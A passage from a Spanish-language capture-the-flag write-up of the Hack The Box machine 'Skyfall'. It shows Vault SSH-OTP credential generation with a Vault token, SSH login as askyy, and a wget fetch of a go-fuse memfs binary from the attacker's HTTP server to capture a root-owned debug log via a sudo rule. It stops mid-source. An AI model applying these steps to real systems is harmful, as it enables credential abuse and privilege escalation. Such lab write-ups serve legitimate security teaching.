</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Error reading ssh/creds/dev_otp_key_role: Error making API request.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>URL: GET http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go>Code: 405. Errors:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>* 1 error occurred:
</span></span></span><span class=line><span class=cl><span class=go>        * unsupported operation
</span></span></span></code></pre></div><p>No tenemos permisos para leerla.</p><p>No obstante, investigando m√°s encuentro que somos capaces de generar nuevas credenciales para <code>SSH</code> basados en <a href=https://developer.hashicorp.com/vault/api-docs/secret/ssh#generate-ssh-credentials class=external-link target=_blank rel=noopener>esta documentaci√≥n</a>. Si tratamos de generar credenciales siguiendo las instrucciones, el server nos pide una direcci√≥n IP a postear:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --request POST --header &#34;X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34; http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;errors&#34;:[&#34;Missing ip&#34;]}
</span></span></span></code></pre></div><p>Si pasamos como data la direcci√≥n IP de la m√°quina v√≠ctima ahora obtenemos datos para el usuario <code>nobody</code>; un usuario que existe en el archivo <code>/etc/passwd</code> de la m√°quina v√≠ctima (y en muchos sistemas es un usuario que viene por defecto):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --request POST --header &#34;X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34; http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role -d &#39;{&#34;ip&#34;:&#34;10.10.11.254&#34;}&#39; | jq
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>  &#34;request_id&#34;: &#34;39d8264b-c279-7b86-3605-1933b7c455af&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_id&#34;: &#34;ssh/creds/dev_otp_key_role/Y7D1NrPXje3w6xRmGjygS3Fi&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;renewable&#34;: false,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_duration&#34;: 2764800,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;data&#34;: {
</span></span></span><span class=line><span class=cl><span class=go>    &#34;ip&#34;: &#34;10.10.11.254&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key&#34;: &#34;1c3be6fe-dd3f-26cf-7a95-572aaae479e9&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key_type&#34;: &#34;otp&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;port&#34;: 22,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;username&#34;: &#34;nobody&#34;
</span></span></span><span class=line><span class=cl><span class=go>  },
</span></span></span><span class=line><span class=cl><span class=go>  &#34;wrap_info&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;warnings&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;auth&#34;: null
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>Puedo ver un campo llamado &ldquo;username&rdquo;, podemos entonces hacer una petici√≥n para el usuario <code>askyy</code> (el cual ya hemos impersonado anteriormente):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --request POST --header &#34;X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34; http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role -d &#39;{&#34;ip&#34;:&#34;10.10.11.254&#34;, &#34;username&#34;:&#34;askyy&#34;}&#39; | jq
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>  &#34;request_id&#34;: &#34;89eb700b-8467-0aea-6d4c-eaf51452fcd2&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_id&#34;: &#34;ssh/creds/dev_otp_key_role/QG1uenKuKgVECQszJHwfnZFH&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;renewable&#34;: false,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_duration&#34;: 2764800,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;data&#34;: {
</span></span></span><span class=line><span class=cl><span class=go>    &#34;ip&#34;: &#34;10.10.11.254&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key&#34;: &#34;40bafb97-ebe2-c3c7-1a13-8f3cc1903a47&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key_type&#34;: &#34;otp&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;port&#34;: 22,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;username&#34;: &#34;askyy&#34;
</span></span></span><span class=line><span class=cl><span class=go>  },
</span></span></span><span class=line><span class=cl><span class=go>  &#34;wrap_info&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;warnings&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;auth&#34;: null
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>donde tenemos una key: <code>40bafb97-ebe2-c3c7-1a13-8f3cc1903a47</code> (esta key cambiar√° cada vez que corramos el commando).</p><p>Finalmente, si usamos esta key generada como la contrase√±a para intentar loguearnos por medio de <code>SSH</code> como el usuario <code>askyy</code> esto tambi√©n funciona:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -o stricthostkeychecking=no askyy@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>(askyy@10.10.11.254) Password: 40bafb97-ebe2-c3c7-1a13-8f3cc1903a47
</span></span></span><span class=line><span class=cl><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Sun Sep  1 00:49:19 2024 from 10.10.16.3
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:~$
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Revisando qu√© comandos puede este usuario correr con <code>sudo</code>, encontramos que podemos correr un par de comandos sin necesidad de proveer contrase√±a:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for askyy on skyfall:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User askyy may run the following commands on skyfall:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
</span></span></span></code></pre></div><p>Revisando las opciones de este comando, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Usage:
</span></span></span><span class=line><span class=cl><span class=go>  vault-unseal [OPTIONS]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Application Options:
</span></span></span><span class=line><span class=cl><span class=go>  -v, --verbose        enable verbose output
</span></span></span><span class=line><span class=cl><span class=go>  -d, --debug          enable debugging output to file (extra logging)
</span></span></span><span class=line><span class=cl><span class=go>  -c, --config=PATH    path to configuration file
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Help Options:
</span></span></span><span class=line><span class=cl><span class=go>  -h, --help           Show this help message
</span></span></span></code></pre></div><p>Incluso si no podemos leer el script en s√≠ ya que no tenemos permisos, podemos encontrar el repositorio de <a href=https://github.com/lrstanley/vault-unseal class=external-link target=_blank rel=noopener>repositorio de Github de <code>Vault Unseal</code></a> el cual es, aparentemente, el mismo programa que podemos correr con <code>sudo</code>. Es un programa el cual se usa para abrir vaults de <code>Hashicorp Vault</code>.</p><p>La primera vez que entr√© en la m√°quina v√≠ctima, revis√© qu√© archivos ten√≠amos disponibles en <code>/home/askyy</code> para ver si hab√≠a algo interesante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 32
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 askyy askyy 4096 Jan 22 14:46 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 root  root  4096 Jan 19 21:33 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx 1 askyy askyy    9 Nov  9  2023 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy 3771 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Jan 18 10:32 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw-r----- 1 root  askyy   33 May 19 22:17 user.txt
</span></span></span></code></pre></div><p>Pero luego de usar el comando con <code>sudo</code>, y proveyendo la flag opcional <code>-d</code> (de <code>debugging</code>), noto que se ha creado un archivo <code>debug.log</code> en el directorio actual de trabajo, del cual es propietario <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Reading: /etc/vault-unseal.yaml
</span></span></span><span class=line><span class=cl><span class=go>[-] Security Risk!
</span></span></span><span class=line><span class=cl><span class=go>[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Check interval: 5s
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Max checks: 5
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Checking seal status
</span></span></span><span class=line><span class=cl><span class=go>[+] Vault sealed: false
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:~$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 askyy askyy 4096 May 20 00:59 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 root  root  4096 Jan 19 21:33 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx 1 askyy askyy    9 Nov  9  2023 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy 3771 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Jan 18 10:32 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw------- 1 root  root   590 May 20 00:59 debug.log
</span></span></span><span class=line><span class=cl><span class=go>-rw-r----- 1 root  askyy   33 May 19 22:17 user.txt
</span></span></span></code></pre></div><p>Y tal cual se vio antes, no tenemos permisos para leer este archivo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ cat debug.log
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cat: debug.log: Permission denied
</span></span></span></code></pre></div><p>Una manera de leer esto es a trav√©s del sistema <code>libfuse</code>:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Informaci√≥n</div><div class=notice-content><code>libfuse</code> provides the reference implementation for communicating with the <code>FUSE</code> kernel module. A <code>FUSE</code> file system is typically implemented as a standalone application that links with <code>libfuse</code>. <code>libfuse</code> provides functions to mount the file system, unmount it, read requests from the kernel, and send responses back.</div></div><p>En corto, es un sistema que nos permite realizar monturas a archivos de sistemas.</p><p>Para esto revisamos, por ejemplo, el archivo <code>/etc/fuse.conf</code> en la m√°quina v√≠ctima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ cat /etc/fuse.conf
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> The file /etc/fuse.conf allows <span class=k>for</span> the following parameters:
</span></span><span class=line><span class=cl><span class=gp>#</span>
</span></span><span class=line><span class=cl><span class=c1># user_allow_other - Using the allow_other mount option works fine as root, in</span>
</span></span><span class=line><span class=cl><span class=gp>#</span> order to have it work as user you need user_allow_other in /etc/fuse.conf as
</span></span><span class=line><span class=cl><span class=gp>#</span> well. <span class=o>(</span>This option allows users to use the allow_other option.<span class=o>)</span> You need
</span></span><span class=line><span class=cl><span class=gp>#</span> allow_other <span class=k>if</span> you want users other than the owner to access a mounted fuse.
</span></span><span class=line><span class=cl><span class=gp>#</span> This option must appear on a line by itself. There is no value, just the
</span></span><span class=line><span class=cl><span class=gp>#</span> presence of the option.
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>user_allow_other
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> <span class=nv>mount_max</span> <span class=o>=</span> n - this option sets the maximum number of mounts.
</span></span><span class=line><span class=cl><span class=gp>#</span> Currently <span class=o>(</span>2014<span class=o>)</span> it must be typed exactly as shown
</span></span><span class=line><span class=cl><span class=gp>#</span> <span class=o>(</span>with a single space before and after the equals sign<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span><span class=nv>mount_max</span> <span class=o>=</span> <span class=m>1000</span>
</span></span></code></pre></div><p>donde la opci√≥n/l√≠nea <code>user_allow_other</code> no est√° comentada (lo que significa que est√° habilitada), permitiendo a otros usuarios escribir a nuestro sistema de archivos.</p><p>Ahora, podr√≠amos ver muchas maneras de c√≥mo usar <code>FUSE</code>, pero la manera m√°s &ldquo;a la segura&rdquo; es usar binarios est√°ticos. Por ejemplo, si usamos binarios est√°ticos compilados en lenguages de programaci√≥n <code>C</code> o <code>Go</code>, si corre en nuestro sistema y no tiene dependencia de librer√≠as, deber√≠a de correr tanto en nuestra m√°quina de atacante como en otras m√°quinas corriendo <code>Linux</code> como la m√°quina v√≠ctima. Es as√≠ como encontramos <code>go-fuse</code> (el cual puede ser descargado desde <a href=https://github.com/hanwen/go-fuse class=external-link target=_blank rel=noopener>su repositorio Github</a>). M√°s espec√≠ficamente, si vamos a la carpeta <code>example</code> folder y luego a <code>memfs</code> i√©ste nos permitir√° crear archivos en memoria en el sistema.</p><p>Para esto descargamos/clonamos el repositorio, vamos a su directorio <code>example/memfs</code> y compilamos/constru√≠mos el binario:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/hanwen/go-fuse.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;go-fuse&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 13206, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (3712/3712), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (764/764), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 13206 (delta 3186), reused 3000 (delta 2946), pack-reused 9494 (from 1)
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (13206/13206), 3.92 MiB | 7.17 MiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (8759/8759), done.
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ cd go-fuse/example/memfs
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x  2 gunzf0x gunzf0x 4096 Aug 31 20:01 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 10 gunzf0x gunzf0x 4096 Aug 31 20:01 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--  1 gunzf0x gunzf0x  957 Aug 31 20:01 main.go
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ go build
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>go: downloading golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 3216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x  2 gunzf0x gunzf0x    4096 Aug 31 20:01 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 10 gunzf0x gunzf0x    4096 Aug 31 20:01 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--  1 gunzf0x gunzf0x     957 Aug 31 20:01 main.go
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x  1 gunzf0x gunzf0x 3280265 Aug 31 20:01 memfs
</span></span></span></code></pre></div><p>Empezamos un servidor temporal <code>Python</code> <code>HTTP</code> en el puerto <code>8080</code> donde est√° ubicado el binario compilado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 3216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x  2 gunzf0x gunzf0x    4096 Aug 31 20:01 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 10 gunzf0x gunzf0x    4096 Aug 31 20:01 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--  1 gunzf0x gunzf0x     957 Aug 31 20:01 main.go
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x  1 gunzf0x gunzf0x 3280265 Aug 31 20:01 memfs
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>y lo descargamos en la m√°quina v√≠ctima usando <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ wget http://10.10.16.3:8080/memfs -O /dev/shm/memfs
</span></span></span><span class=line><span class=cl><span class=go>--2024-09-01 00:12:21--  http://10.10.16.3:8080/memfs
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.3:8080... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 3280265 (3.1M) [application/octet-stream]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äò/dev/shm/memfs‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/dev/shm/memfs                             100%[=======================================================================================&gt;]   3.13M   722KB/s    in 7.6s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:~$ chmod +x /dev/shm/memfs
</span></span></span></code></pre></div><p>Vamos al directorio donde est√° el binario, creamos un directorio (llamado <code>output</code>) donde realizaremos la montura y lo corremos. En mi caso todo ser√° guardado en un archivo llamado <code>test</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ cd /dev/shm
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:/dev/shm$ ./memfs
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>usage: main MOUNTPOINT BACKING-PREFIX
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ mkdir output
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:/dev/shm$ ./memfs output test
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mounted!
</span></span></span></code></pre></div><p>Ahora, logueamos en otra sesi√≥n de <code>SSH</code> con el truco que hab√≠amos mostrado previamente, entramos al directorio donde est√° ubicado <code>output</code> y corremos el comando con <code>sudo</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm/output$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/09/01 01:04:22 open debug.log: permission denied
</span></span></span></code></pre></div><p>Tenemos un error de permisos. Esto es gracias a que nuestra aplicaci√≥n (el binario compilado <code>memfs</code>) no est√° dejando a otros usuarios escribir en nuestra montura.</p><p>De manera que debemos de modificar el c√≥digo fuente de <code>memfs</code> para permitirlo. Antes de ello, recordar que debemos &ldquo;desmontar&rdquo; (unmount) corriendo <code>fusermount</code> (adem√°s, recordar irnos/salir del directorio <code>output</code> en todas las sesiones que est√©n ubicadas dentro del directorio <code>output</code>, de otra manera esto nos entregar√° un error <code>fusermount: failed to unmount /dev/shm/output: Device or resource busy</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ fusermount -u output
</span></span></span></code></pre></div><p>Si leemos el c√≥digo fuente de <code>main.go</code> de <code>example/memfs</code> del repositorio <code>go-fuse</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// Copyright 2016 the Go-FUSE Authors. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=c1>// Use of this source code is governed by a BSD-style
</span></span></span><span class=line><span class=cl><span class=c1>// license that can be found in the LICENSE file.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// Mounts MemNodeFs for testing purposes.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse/nodefs&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Scans the arg list and sets up flags
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>debug</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Bool</span><span class=p>(</span><span class=s>&#34;debug&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;print debugging messages.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>NArg</span><span class=p>()</span> <span class=p>&lt;</span> <span class=mi>2</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=c1>// TODO - where to get program name?
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;usage: main MOUNTPOINT BACKING-PREFIX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>mountPoint</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>prefix</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>root</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewMemNodeFSRoot</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
